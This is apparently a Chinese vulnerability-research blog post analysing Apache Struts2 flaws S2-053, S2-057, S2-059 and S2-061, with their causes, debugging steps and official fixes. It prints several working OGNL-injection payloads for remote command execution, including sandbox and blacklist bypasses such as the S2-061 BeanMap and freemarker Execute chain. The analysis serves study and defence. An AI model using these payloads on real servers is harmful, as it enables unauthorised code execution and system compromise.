目录
--

- [前言](#preface)
- [S2-001](#s2-001)
- [S2-003](#s2-003)
- [S2-005](#s2-005)
- [S2-007](#s2-007)
- [S2-008](#s2-008)
- [S2-009](#s2-009)
- [S2-012](#s2-012)
- [S2-013](#s2-013)
- [S2-015](#s2-015)
- [S2-016](#s2-016)
- [S2-032](#s2-032)
- [S2-045](#s2-045)
- [S2-052](#s2-052)
- [S2-053](#s2-053)
- [S2-057](#s2-057)
- [S2-059](#s2-059)
- [S2-061](#s2-061)
- [小结](#summary)
- [Reference](#reference)

前言
--

尽管现在struts2用的越来越少了，但对于漏洞研究人员来说，感兴趣的是漏洞的成因和漏洞的修复方式，因此还是有很大的学习价值的。毕竟Struts2作为一个很经典的MVC框架，无论对涉及到的框架知识，还是对过去多年出现的高危漏洞的原理进行学习，都会对之后学习和审计其他同类框架很有帮助。

PS: 本系列分析的漏洞均为已公开的漏洞，Struts2官方都早已发布修复版本。建议直接使用最新版本。

S2-053
------

官方漏洞公告：<https://cwiki.apache.org/confluence/display/WW/S2-053>

影响版本：`Struts 2.0.0` - `Struts 2.3.33`, `Struts 2.5` - `Struts 2.5.10.1`

漏洞复现与分析
-------

从漏洞公告可获悉：在FreeMarker模板中使用struts2标签库时，如果使用了表达式`${}`去引用可控输入时，便会导致RCE攻击。

下面使用docker镜像`medicean/vulapps:s_struts2_s2-053`进行调试分析。该环境使用的是Struts2 `2.5.10.1`版本。

在该环境中，`Index.action`的返回页面使用FreeMarker模板去渲染。在freemarker模板文件`index.ftl`里使用了struts2标签`s:url`，即`@s.url`，且该标签的`value`属性引用了外界可控输入的`name`参数的值。代码如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6c124f1ce77a555412d712f08c5891b85ac3f4e9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6c124f1ce77a555412d712f08c5891b85ac3f4e9.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a9cd39726d819e3dbce8a56f6236932041f0a15f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a9cd39726d819e3dbce8a56f6236932041f0a15f.png)

简单执行OGNL表达式如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ae63e81f869ec4ba2355c767689bbd3a1d62e65d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ae63e81f869ec4ba2355c767689bbd3a1d62e65d.png)

由于漏洞触发是在Struts2处理返回页面，即`Result`对象阶段。因此在`DefaultInvocation`开始调度`Result`对象处，以及`OgnlValueStack#findValue()`方法处下断点，便可知道漏洞触发执行的调用栈。

由于`Index.action`的`result`标签的`type`属性为`freemarker`，所以`DefaultInvocation`调度的`Result`对象其实是`FreemarkerResult`，它会根据模板文件创建对应的模板对象`Template`来进行一系列的解析渲染操作。在这个过程中，它先是解析表达式`${name}`获取`name`参数的值，然后对值进行OGNL表达式的计算。关键代码如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-826e04e0dde7ec36765ee39b60b80c7c42d3a0f6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-826e04e0dde7ec36765ee39b60b80c7c42d3a0f6.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b7037930f73d7c311ab11b628ae815a8a2523caa.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b7037930f73d7c311ab11b628ae815a8a2523caa.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bcaebd749e4333b1dd49403e63b6b0b153f79e30.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bcaebd749e4333b1dd49403e63b6b0b153f79e30.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-85414e8d2e7fc539ad9e2955031b65241b3c8e00.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-85414e8d2e7fc539ad9e2955031b65241b3c8e00.png)

### 可回显PoC

拿S2-045的exploit稍微修改一下便可：

```php
%{
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess?(#_memberAccess=#dm):
        (
        (#container=#context['com.opensymphony.xwork2.ActionContext.container']).
        (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
        (#ognlUtil.getExcludedPackageNames().clear()).
        (#ognlUtil.getExcludedClasses().clear()).
        (#context.setMemberAccess(#dm)))).
(#cmd='id').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
(#p=new java.lang.ProcessBuilder(#cmds)).
(#p.redirectErrorStream(true)).
(#process=#p.start()).
(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ed982e32b4c8d0ba63a696e4e02150d40e097cf.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ed982e32b4c8d0ba63a696e4e02150d40e097cf.png)

漏洞修复
----

通过版本代码比对发现，Struts2 `2.5.12`版本做了很多改动。但通过调试发现，针对这个漏洞，最关键的修复代码在于将`OgnlUtil`类里的黑名单集合`excludedPackageNames`和`excludedClasses`都由原来的`HashSet`改为不可修改的集合类`Collections$UnmodifiableSet`来替代，从而使得S2-045的exploit失效了。  
如下图所示：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ee94275600fdb8c5bdc6f599c14867ee80523bad.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ee94275600fdb8c5bdc6f599c14867ee80523bad.png)

**但！很遗憾**，这个修复可以被轻易绕过，因为修复后的代码中，`OgnlUtil`类里的`excludedPackageNames`和`excludedClasses`属性，只是它引用的集合对象是一个不可修改的对象，故可通过它们的`setter`方法，将其引用到一个空集合对象即可。

这里直接放结论：将在上面的可回显PoC稍加修改，然后**连续执行两次**，便可在修复后的Struts2 `2.5.12`版本getshell！至于为什么需要执行两次才行，这个留到分析S2-057漏洞时再好好说道。  
修改后的PoC如下：

```php
%{
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess?(#_memberAccess=#dm):
        (
        (#container=#context['com.opensymphony.xwork2.ActionContext.container']).
        (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
        (#ognlUtil.setExcludedPackageNames('')).
        (#ognlUtil.setExcludedClasses('')).
        (#context.setMemberAccess(#dm)))).
(#cmd='id').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
(#p=new java.lang.ProcessBuilder(#cmds)).
(#p.redirectErrorStream(true)).
(#process=#p.start()).
(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8dab4c150c245c662a2a963c9fc77bc33828c186.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8dab4c150c245c662a2a963c9fc77bc33828c186.png)

S2-057
------

官方漏洞公告：<https://cwiki.apache.org/confluence/display/WW/S2-057>

影响版本：`Struts 2.0.4` - `Struts 2.3.34`, `Struts 2.5` - `Struts 2.5.16`

漏洞复现与分析
-------

从漏洞公告可获悉，该漏洞有两个前提条件，如下

- `alwaysSelectFullNamespace`为`true`;
- `struts.xml`文件中，没有对`action`对象的上层(即`package`标签)设置`namespace`属性，或者`namespace`属性使用了通配符。

满足这两个前提条件的情况下，存在4个攻击向量：

- `ServletActionRedirectResult`：对应的result type为：`redirectAction`；
- `ActionChainResult`：对应的result type为：`ActionChainResult`;
- `PostbackResult`：对应的result type为：`postback`;
- `ServletUrlRenderer`：对应`<s:url>`标签的处理。

这里仅以`ServletActionRedirectResult`为例进行调试分析，其他3个分析起来差不多。

下面使用docker镜像`medicean/vulapps:s_struts2_s2-057`进行调试分析。该环境使用的是Struts2 `2.5.16`版本。

如下图，应用开启了`alwaysSelectFullNamespace`特性，action对象`actionChain1`的`result`对象的类型设置为`redirectAction`，且`package`没有设置`namespace`属性。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ed977caf7a4f9ea5e37a42f81aa2e8cb6363370.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ed977caf7a4f9ea5e37a42f81aa2e8cb6363370.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f5850770446711908f6018ce3d319dd96543dc00.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f5850770446711908f6018ce3d319dd96543dc00.png)

简单表达式执行PoC如下：

```php
hxxp://host:port/S2-057/${123+456}/actionChain1.action
```

访问后，跳转的Url如下：

```php
hxxp://host:port/S2-057/579/register2.action
```

当`alwaysSelectFullNamespace`特性开启时，`namespace`的值会从`uri`中去获取，如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1ebe7a7b50451c4506d243195a8d8811df17a234.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1ebe7a7b50451c4506d243195a8d8811df17a234.png)

后面在处理`Result`对象时，在`ServletActionRedirectResult#execute()`方法中，获取前面得到的`namespace`的值，即表达式`${123+456}`，然后与`result`指定的`action`名进行字符串拼接，拼接后的字符串赋值给`ServletActionRedirectResult#location`属性，如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8b90965866ce7484afdcb27a0cff0c44b733b1d9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8b90965866ce7484afdcb27a0cff0c44b733b1d9.png)

继续跟进代码，在`StrutsResultSupport#conditionalParse()`方法中看到熟悉的`TextParseUtil#translateVariables()`方法调用。没错，后面的执行流程就和S2-012是一样的了，这里不再详述。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2a38bc95d9e315fbc787761262ab1acc8d7f13a1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2a38bc95d9e315fbc787761262ab1acc8d7f13a1.png)

下面重点说一下命令执行PoC的构造。

可回显PoC
------

因为在Struts2 `2.5.16`(依赖的ognl版本为`3.1.15`)中，`OgnlContext`的`get()`方法已经不支持传入`OgnlContext.CONTEXT_CONTEXT_KEY`常量，故无法像以前一样在OGNL表达式中使用`#context`直接访问上下文对象`context`。

因此，我们需要找另外的方式先去获取`context`上下文对象，参考文章\[3\]中提出通过上下文对象内部集合里的`attr`对象来获取`context`上下文对象。因为`attr`是可以使用`#attr`去访问的，它是一个`AttributeMap`对象。如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-df78c7ac4b9ddd04cc4f537a85172db7710fdb16.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-df78c7ac4b9ddd04cc4f537a85172db7710fdb16.png)

从`AttributeMap#get()`方法可以看到，其实它会去上下文对象`context`内部存放的`request`、`session`、`application`对象去查值。其中，通过`request.get("struts.valueStack")`便可获取值栈`OgnlValueStack`，而`OgnlValueStack`对象中又存在指向上下文对象的属性。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ede7bdfc1a669d1394386df3969bda4be6fc7c36.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ede7bdfc1a669d1394386df3969bda4be6fc7c36.png)

因此，便可通过`#request['struts.valueStack'].context`或`attr['struts.valueStack'].context`来获取上下文对象。

接着，再配合前面S2-053的修复绕过，即利用`setter`方法将指向黑名单集合的属性值`excludedClass`和`excludedPackageNames`指向一个空的集合。

综上可得，命令执行可回显的PoC如下：

```php
${
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#ct=#request['struts.valueStack'].context).
(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).
(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ou.setExcludedPackageNames('')).(#ou.setExcludedClasses('')).
(#ct.setMemberAccess(#dm)).
(#a=@java.lang.Runtime@getRuntime().exec('id')).
(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))
}
```

但为什么执行第一次的时候无效呢？

是因为PoC里改的是`OgnlUtil`对象里的`excludedClass`和`excludedPackageNames`，而实际进行黑名单校验时，是在安全管理器`SecurityMemberAccess`中进行的，使用的也是`SecurityMemberAccess`中的`excludedClass`和`excludedPackageNames`属性。

为什么执行第二次就可以了呢？

是因为每次请求，在`OgnlValueStack#setOgnlUtil()`方法中，`SecurityMemberAccess`都会从`OgnlUtil`中获取类和包名黑名单，并通过`setter`方法赋值到自身的属性`excludedClass`和`excludedPackageNames`。如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cb041e16299e85d3b43410d839a8b379a121c55c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cb041e16299e85d3b43410d839a8b379a121c55c.png)

因为第一次请求，我们已经将`OgnlUtil`的`excludedClass`和`excludedPackageNames`给指向了空的集合。所以第二次请求，`SecurityMemberAccess`从`OgnlUtil`获取到的黑名单也因此变成了空的集合。从而实现了绕过。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a051a67e865da8458cf652c6e98d1f39de18eab1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a051a67e865da8458cf652c6e98d1f39de18eab1.png)

### 漏洞修复

在Struts2 `2.5.17`版本中，`DefaultActionMapping`在获取`namespace`时增加了正则匹配字符白名单的校验。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21ef71d179db25b2ad9b5eab39a0f8e329aefe48.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21ef71d179db25b2ad9b5eab39a0f8e329aefe48.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ce2d9a3b855a31331eed8654441ff79acf7734c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ce2d9a3b855a31331eed8654441ff79acf7734c.png)

S2-059
------

官方漏洞公告：<https://cwiki.apache.org/confluence/display/WW/S2-059>

影响版本：`Struts 2.0.0` - `Struts 2.5.20`

漏洞复现与分析
-------

从漏洞公告可获悉，该漏洞的场景是：当Struts2的标签属性值引用了`action`对象的参数值时，便会出现OGNL表达式的二次解析，从而产生RCE风险。

> **注**：虽然官方漏洞公告里说该漏洞影响到`2.5.20`版本，但实际上公开的用于`2.5.16`版本的命令执行的PoC在`2.5.20`版本则失效。原因后面会说到。

下面使用Struts2 `2.5.16`版本进行复现、分析和调试。构造一个符合条件的应用，关键代码如下

`index.jsp`

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ taglib prefix="s" uri="/struts-tags" %>
<html>
<head>
    <title>S2-059 demo</title>
</head>
<body>
<s:a id="%{id}">your input id: ${id}
    <br>has ben evaluated again in id attribute
</s:a>
</body>
</html>
```

`struts.xml`

```xml
<?xml version="1.0" encoding="UTF-8" ?>


<struts>
    <constant name="struts.devMode" value="false"/>

    <package name="default" namespace="/" extends="struts-default">
        <default-action-ref name="index"/>
        <action name="index" class="org.pwntester.action.IndexAction" method="changeId">
            <result>index.jsp</result>
        </action>
    </package>
</struts>
```

`IndexAction.java`

```java
public class IndexAction extends ActionSupport {
    private String id;

    public IndexAction() {}
    public String changeId() {
        return "success";
    }
    public String getId() {
        return this.id;
    }
    public void setId(String id) {
        this.id = id;
    }
}
```

这里我们根据漏洞公告中的示例，使用`<s:a>`标签，并在标签中使用`id`属性来引用`action`中的参数值。

因此我们可以将断点下在`<s:a>`对应的标签类`AnchorTag`的`doStartTag()`方法中(实际调用的是父类方法`ComponentTagSupport#doStartTag()`)，然后进行调试。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af8e19196b42af2dd490f232fff0e1478c8a9e5c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af8e19196b42af2dd490f232fff0e1478c8a9e5c.png)

跟进`AnchorTag#populateParams()`方法，在其父类`AbstractUITag#populateParams()`方法中发现调用`Anchor#setId()`对`id`属性进行设置。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3ad624a3bae6ef8ba96319fda02541e6d91ce465.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3ad624a3bae6ef8ba96319fda02541e6d91ce465.png)

跟进`Anchor#setId()`，`Anchor`会调用父类方法`Component#findValue()`，在该方法中，如果`altSyntax`特性是开启的(`altSyntax`默认开启)，且`id`属性的值是一个符合`%{}`形式的表达式的情况下，会调用我们熟悉的`TextParseUtil.translateVariables()`进行OGNL表达式求值，求值的过程就是从`IndexAction`对象中通过`getter`方法来获取其`id`属性的值，即我们传入的`id`参数的值。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7ec23daa68eaffb99231e81eaef5e8d932d661b4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7ec23daa68eaffb99231e81eaef5e8d932d661b4.png)

到此，`<s:a id=%{id}>`标签的`id`属性就被赋值好了，即第一次的OGNL表达式求值就完成了。

再次回到`ComponentTagSupport#doStartTag()`方法中继续跟进，发现调用`Anchor#start()`方法，跟进该方法。一直跟进，发现在`UIBean#populateComponentHtmlId()`方法中，调用`Component#findStringIfAltSyntax()`对`Anchor`对象的`id`属性值进行处理，如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-46f12d8da7a882115e9c014d01f72774145c2b91.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-46f12d8da7a882115e9c014d01f72774145c2b91.png)

跟进去，发现最终在`Component#findValue()`方法中又看到了熟悉的`TextParseUtil.translateVariables()`。跟到这里就是第二次OGNL表达式求值，如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bfda0a85367ea2febe565c1dd07b0c6fe1b9cb47.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bfda0a85367ea2febe565c1dd07b0c6fe1b9cb47.png)

到此漏洞原理的部分就结束了。下面说一下命令执行PoC的构造。

可回显PoC
------

在Struts2 `2.5.16`版本，直接使用S2-057的PoC便可，但最前面的`$`符号要改为`%`。同样是发送两次请求。

```php
%{
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#ct=#request['struts.valueStack'].context).
(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).
(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ou.setExcludedPackageNames('')).(#ou.setExcludedClasses('')).
(#ct.setMemberAccess(#dm)).
(#a=@java.lang.Runtime@getRuntime().exec('id')).
(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b823e63567d5cc14b1e953aaf1b5422fd68c955c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b823e63567d5cc14b1e953aaf1b5422fd68c955c.png)

接着说一下为什么该命令执行PoC在Struts2 `2.5.20`版本中失效。

**1、Struts2 `2.5.20`的类和包名的黑名单扩充了**，如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5a28950871db550cf952e99cddcad91bd7036fca.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5a28950871db550cf952e99cddcad91bd7036fca.png)

其中增加了包名`com.opensymphony.xwork2.ognl`，导致无法通过`#request['struts.valueStack'].context`或`#attr['struts.valueStack'].context`来获取上下文对象。因为`OgnlRuntime#getFieldValue()`方法中有引入沙盒保护，会禁止黑名单里的类的对象去获取成员属性。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-480878715f78713f95fef65b85be6ead0f221aac.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-480878715f78713f95fef65b85be6ead0f221aac.png)

**2、`OgnlRuntime#getStaticField()`方法也引入了Struts2的沙盒保护**

Struts2 `2.5.16`版本所依赖的`ognl`库的版本为`3.1.15`，Struts2 `2.5.20`版本依赖的`ognl`库的版本为`3.1.21`。在`ognl-3.1.21`的类`OgnlRuntime#getStaticField()`中也引入了Struts2的沙盒进行保护，禁止黑名单类去获取静态属性，关键代码如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ae3efcf437d7b9bf5ed0cb60689624ce387489a9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ae3efcf437d7b9bf5ed0cb60689624ce387489a9.png)

这将导致无法通过表达式`@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`获取`OgnlContext`类的静态属性`DEFAULT_MEMBER_ACCESS`。

漏洞修复
----

Struts2 `2.5.22`版本并没有对漏洞点进行修复，而是在`2.5.20`版本的基础上再次扩充了类/包名黑名单。另外，还使用了更新版本的依赖库`ognl-3.1.26`，在该版本中，增加了`Strict`模式，如果使用该模式，`OgnlRuntime#invokeMethod()`方法就会校验当前调用的类，禁止常见危险的类调用方法。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0a92bc2912ef50ff78ea85ab4e06418107feae14.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0a92bc2912ef50ff78ea85ab4e06418107feae14.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6cde148e688f7694374f22474d4912cce8b26522.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6cde148e688f7694374f22474d4912cce8b26522.png)

S2-061
------

官方漏洞公告：<https://cwiki.apache.org/confluence/display/WW/S2-061>

影响版本：Struts 2.0.0 - Struts 2.5.25

漏洞复现与分析
-------

该漏洞是S2-059的绕过。前面分析S2-059时说过，从`2.5.20`版本开始，随着安全沙盒的增强，使得在`2.5.20`之后，利用OGNL表达式进行远程代码执行受到了很大的限制，并无公开的沙盒绕过的利用，直到S2-061的出现。

因此漏洞原理和S2-059是一样的。下面来看看已公开的命令执行PoC是如何绕过沙盒的。

可回显PoC
------

由于沙盒的增强，我们无法像之前一样轻易的获取上下文对象`context`：

- `OgnlContext`删除了`CONTEXT_CONTEXT_KEY`这个`key`，故无法通过`OgnlContext#get()`方法，即通过`#context`获取上下文对象;
- 包名黑名单中包含`com.opensymphony.xwork2.ognl.`，故无法通过`#request['struts.valueStack'].context`或`attr['struts.valueStack'].context`获取上下文对象。
- 包名黑名单中包含`ognl.`，且`OgnlRuntime`类引入了沙盒保护，因此即使获得上下文对象`context`，也无法通过OGNL表达式直接操作它的属性和方法，只能通过间接的方式。

因此只能通过调试看看上下文对象`OgnlContext`中还有什么其他可利用的对象，来间接获取上下文对象。  
这里使用`#application`来获取`OgnlContext`内部`Map`集合中的`ApplicationMap`对象。`ApplicationMap`内部存放了整个应用实例的一些对象，比如这里通过键`org.apache.tomcat.InstanceManager`来获取Tomcat中的`DefaultInstanceManager`对象。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-86412e99e27910ffa8b43d634e3ed50833b1b136.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-86412e99e27910ffa8b43d634e3ed50833b1b136.png)

可使用`DefaultInstanceManager#newInstance()`方法，指定类名，来实例化任意对象，但前提是指定的类需要有无参构造方法。

然后使用该方法来创建类`org.apache.commons.collections.BeanMap`的实例对象，然后通过`BeanMap`的`setBean/get`方法来间接获取上下文对象`context`。

以下是`BeanMap#setBean()`方法的实现。它会获取指定`bean`对应的类的所有读写(`setter/getter`)方法，并保存在内部的`HashMap`集合中。另外，每次调用`setBean()`方法，原本存放读写(`setter/getter`)方法的内部`HashMap`集合都会被清空。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c86ce4be293275d75f442c5b1f3c3187a34c3143.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c86ce4be293275d75f442c5b1f3c3187a34c3143.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-62e15694bf24bc202abd1bf2faea271cb6f39df5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-62e15694bf24bc202abd1bf2faea271cb6f39df5.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-75c24a652ee38fb7e6dd4c43f200f50f0568623e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-75c24a652ee38fb7e6dd4c43f200f50f0568623e.png)

而`BeanMap#get()`则是获取当前`bean`的指定的`getter`方法。

便可使用以下表达式获取上下文对象`context`：

```php
(#instancemanager=#application['org.apache.tomcat.InstanceManager']).
(#stack=#request['struts.valueStack']).
(#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).
(#bean.setBean(#stack)).
(#context=#bean.get('context'))
```

然后使用同样的方式来获取上下文`context`对象中的安全管理器对象`SecurityMemberAccess`，即安全沙盒的主要实现类。并使用`BeanMap#put()`方法实现黑名单的置空操作。即：

```php
(#macc=#bean.get('memberAccess')).
(#bean.setBean(#macc)).
(#emptyset=#instancemanager.newInstance('java.util.HashSet')).
(#bean.put('excludedClasses',#emptyset)).
(#bean.put('excludedPackageNames',#emptyset))
```

到此，便实现了绕过沙盒，获取了上下文对象`context`，并将沙盒的黑名单指向了一个空的集合。剩下要做的便是执行命令。前面提到过，从`ognl`从`3.1.26`版本开始，增加了`Strict`模式，且是默认启用的。在该模式下，`OgnlRuntime#invokeMethod()`方法还将`java.lang.Runtime`和`java.lang.ProcessBuilder`这两类给ban掉了。这就意味着即使前面绕过了沙盒，最终还是无法在表达式中直接调用这两个类的方法去执行命令。只能通过间接的方式，比如其他某个类的某个方法，里面调用了`Runtime#exec()`或`ProcessBuilder#start()`，且命令参数可控。

`S2-061`的报告者，知名的安全研究员`pwntester`给出了一种方法，就是通过调用`freemarker`中的`freemarker.template.utility.Execute#exec()`实现命令执行。

> 估计是他在研究FreeMarker模板注入漏洞及沙盒绕过的时候想到的。详见他的Blackhat议题：&lt;Room for Escape: Scribbling Outside the Lines of Template Security&gt;(参考\[6\])

最终可得：

```php
%{
(#instancemanager=#application['org.apache.tomcat.InstanceManager']).
(#stack=#request['struts.valueStack']).
(#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).
(#bean.setBean(#stack)).
(#context=#bean.get('context')).
(#bean.setBean(#context)).
(#macc=#bean.get('memberAccess')).
(#bean.setBean(#macc)).
(#emptyset=#instancemanager.newInstance('java.util.HashSet')).
(#bean.put('excludedClasses',#emptyset)).
(#bean.put('excludedPackageNames',#emptyset)).
(#arglist=#instancemanager.newInstance('java.util.ArrayList')).
(#arglist.add('id')).
(#execute=#instancemanager.newInstance('freemarker.template.utility.Execute')).
(#execute.exec(#arglist))}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ab15f886bb940ed1743c38014467f761c194237a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ab15f886bb940ed1743c38014467f761c194237a.png)

漏洞修复
----

通过版本比对，Struts2在`2.5.26`版本，不仅修复了漏洞触发点，还扩充了包名黑名单以增强沙盒。

1、修改了`UIBean#setId()`，从而避免OGNL表达式二次解析。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d76c9f49db23b805d39791ac829c0ae86b951927.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d76c9f49db23b805d39791ac829c0ae86b951927.png)

2、在包名黑名单中添加了属于各种中间件(如：Tomcat、JBoss、Weblogic、Jetty、Websphere)的包名。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6b42c7e165352193cf689676ee12e61857aaba06.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6b42c7e165352193cf689676ee12e61857aaba06.png)

小结
--

以上，Struts2的高危漏洞分析系列就暂告一段落了。

在这个过程中，不仅提升我的Java漏洞调试能力，积累了经验，同时看到了安全研究人员和程序员之间的攻防博弈，还是蛮有意思的。

一开始我提到，尽管现在struts2用的越来越少了，但对于漏洞研究人员来说，感兴趣的是漏洞的成因和漏洞的修复方式，因此还是有很大的学习价值的。

Struts2的绝大部分高危漏洞，都是由于不安全的OGNL表达式执行。

OGNL表达式引擎，是Struts2为了解决在MVC模式中，数据在各层间的表现形式不同而造成数据流转和访问的问题而引入的。它可以构建表达式和Java对象之间的映射关系，且具有丰富多样的表达式语法计算。它非常强大和灵活。但往往功能强大灵活的同时就会带来安全问题，因为OGNL表达式可以操作Java对象和其成员。另外，通过分析这一系列的漏洞，就可以发现，OGNL表达式求值是贯穿在整个Struts2框架中的，非常的多地方有用到，比如拦截器、标签库、返回对象`Result`、异常信息等。所以漏洞触发点就会有很多。因此，在这些漏洞的修复方案里，不仅有在上层代码进行相关入参的安全过滤(比如正则白名单)，还有沙盒的引入以限制命令执行的漏洞利用。但随着一次又一次的被绕过，沙盒也越来越强，即限制越来越多，绕过的难度越来越大。得依靠一些依赖包里的对象去实现，就像S2-061的代码执行，就是通过Tomcat里的`DefaultInstanceManage`和Freemarker里的`freemarker.template.utility.Execute`来实现的，也因此新的黑名单里增加了各类Java中间件的常见包名。往后的沙盒绕过就更难了。

另外，对于Struts2漏洞这种`sink`比较固定的情况下，很适合使用CodeQL来自动化挖掘漏洞触发链。Github安全实验室博客就有好几篇讲到使用CodeQL挖掘Struts2漏洞的文章。后面有时间的话我也会分享CodeQL相关的内容。

Reference
---------

\[1\] hxxp://vulapps.evalbug.com/tags/#struts2  
\[2\] hxxps://github.com/vulhub/vulhub/tree/master/struts2  
\[3\] hxxps://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/  
\[4\] hxxps://securitylab.github.com/research/apache-struts-CVE-2018-11776/  
\[5\] 《Struts2技术内幕：深入解析Struts2架构设计与实现原理》- 作者:陆舟  
\[6\] hxxps://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf